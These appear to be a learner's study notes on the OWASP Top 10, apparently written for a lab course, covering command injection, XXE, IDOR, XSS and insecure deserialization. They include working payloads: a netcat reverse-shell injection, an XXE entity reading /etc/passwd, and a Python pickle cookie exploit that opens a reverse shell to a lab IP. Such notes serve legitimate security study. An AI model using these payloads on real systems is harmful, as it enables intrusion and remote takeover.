## Severity 1 : Injection

Common example:
* SQL injection
* Command injection

Able to :
* Access, Modify, Delete information in database
* gain access to users’ systems

### OS command injection

 server-side code (e.g. PHP) make a **system call** in hosting machine
 
 worst thing : Spawn a reversahell 
 * e.g. `;nc -e /bin/bash`

*blind command injection* : Server does not return the response
*Active command injection* : Return the response to the user

code exmaple
![](https://i.imgur.com/yRdpaGJ.png)
1.  Checking `commandString` is set or not
2.  If it set, `$command_string` get the value of input field
3.  Execute the function `passthru($command_string)`
4.  If comes with error, output the error to page

How to detect Active command Injection:
* If someone write code like this, we can try some shell commands to detect
* Linux : `whoami` `id` `ifconfig/ip addr` `uname -a`
* Windows : `whoami` `ver` `ipconfig` `tasklist` `netstat -an`

## Severity 2 : Broken Authentication

common flaws :
* Brute force attacks
* Weak crednetial : strong password policy (easy password are not allowed)
* Weak Session Cookie : session value should not contain predictable values

Solve the flaws:
* Enforce a strong password policy
* Automatic lockout after a certain number of attempts
* Multi Factor Authentication : e.g. using code on their mobile device

### Re-registration of an existing user

register account in user : ` admin`
and it register new user but this user have same right as normal admin.

## Severity 3 : Sensitive Data Exposure

data directly linked to customers (names, financial infor...)

*flat-file* databses : databases stored as files
common one is `sqlite3`

### intro to sqlite3

access SQlite databae: `sqlite3 <database-name>`
check tables : `.table`
check table info : `PRAGMA table_info(<table>)`

exmaple SQL command : `SELECT * FROM <table>*`

### CrackStation
https://crackstation.net/

## Severity 4 XML External Entity 

XML Enternal Entity(XXE) attacks, abuses features of XML parsers/data.

XXE atacks type:
* in-band : recerive immediate response to the XXE payload
* out-of-band(OOB-XXE) :

### XML
eXtensible Markup Language : encoding, both humain-readable & machine-readable

charactericstic:
* platform-independaent & programming labguage independent
* validating using DTD & Schema, free from syntax error


XML starts with *XML prolog* (**no compulsory**, but good practice)
`<?xml version="1.0" encoding="UTF-8"?>`

XML document must contain ROOT element
```xml
<?xml version="1.0" encoding="UTF-8"?>
<mail>
   <to>falcon</to>
   <from>feast</from>
   <subject>About XXE</subject>
   <text>Teach about XXE</text>
</mail>
```

### DTD
Document Type Definition : defines structure & legal elements , attributes.

`note.dtd`
```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

* `!DOCTYPE note` : defines root element named `note`
* `!ELEMENT note` : defines note element must comtain : "to, from, heading, body"
* `!ELEMENT to` : defines `to` elemnts to be type `#PCDATA`
* `#PCDATA` means parseable character data

### XXE Payload

`!ENTITY` can be use to do injection

e.g. Display some extra infor
```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

e.g. read SYSTEM FILEs
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```




we can validating some part of XML by DTD.

E.G.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

## Severity 5 Broken Access Control

Scenario #1 :
* App uses unverified data in SQL call
```bash
pstmt.setString(1, request.getParameter("acct"));
ResultSet results = pstmt.executeQuery( );
```
* We just edit the `acct` parameter in browser & we can send request with any account

Scenario #2:
* attakcer force browses to target URLs
* which means no authentication to sensitive pages

### IDOR
Insecure Direct Object Reference

e.g. this URL can let me see our account info
`https://example.com/bank?account_number=1234`

if we can directly change the parameter & see another's info, there is a huge problem.

## Severity 6 Security Misconfiguration

security misconfiugration include:
* poorly configured permission on cloud services
* Having unnecessary features
* Default accounts with unchanged passwords
* Not using HTTP Secure Header

### Default Password


## Severity 7 XSS
XSS : Cross-site scripting

type of injection which can allow execute scripts on victim's machine

XSS:
* Stored XSS : most dangerous type, string originates from database. Website may allow unsanitisesd user input insert to database.
* Reflected XSS : Payload is victims request to website & website response back the payload to user. (need victim clicking a URL)
* DOM-Based XSS : 

### Payloads

Popup
```html
<script>alert(“Hello World”)</script>
```

Write some HTML
```html
<script>document.write(...)</script>
```

XSS Keylogger : http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html)

Port Scanning : (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html

## Severity 8 Insecure Deserialization

replacing data processed by an application with malicious code.
From *DoS(Denial of Service)* to *RCE(Remote Code Execution)*

reason of rank as 8/10:
* Low exploitability : no tool or framewaork to use

### Serialisation

### Cookie
change cookie value to `admin` to by pass the permission

example:
![](https://i.imgur.com/9F6YPlQ.png)

1. A cookie is encoded & stored in browser
2. Visit the feedback form, the cookie is decoded & deserialised
![](https://i.imgur.com/ntU7SZ7.png)

We can encode our command to base64, so that the malicious code would be execute.

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' '/bin/sh -i 2>&1 | netcat 10.13.23.170 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))

print(base64.b64encode(pickle.dumps(rce())))
```
 this code would encode commnad to base64 with `pickle.dumps`
 
 and we can run our netcat listener
 ```bash
 $ nc -lvnp 4444
 ```
 
 the encoded payload might looked like this 
 ![](https://i.imgur.com/q1Ocwfi.png)

we can change the value of `encodedPayload` in cookie to the content **inside two speech marks **

## Severity 9 Components With Known Vulnerabilities

If the page show some version information, we can exploit that.

e.g.:
![](https://i.imgur.com/YcIdqKv.png)

then we can check whether is there an vuln with `nostromo 1.9.6` in [exploit-db](https://www.exploit-db.com/)

and we indeed find a vuln with malicious code
![](https://i.imgur.com/lewbhbr.png)

& we can click download button

after executed, we found this error
![](https://i.imgur.com/mAgVCjO.png)

however, we only need to uncommnet this line.
![](https://i.imgur.com/PE1v4QQ.png)

and it shows us the usage
![](https://i.imgur.com/KRwQu1H.png)
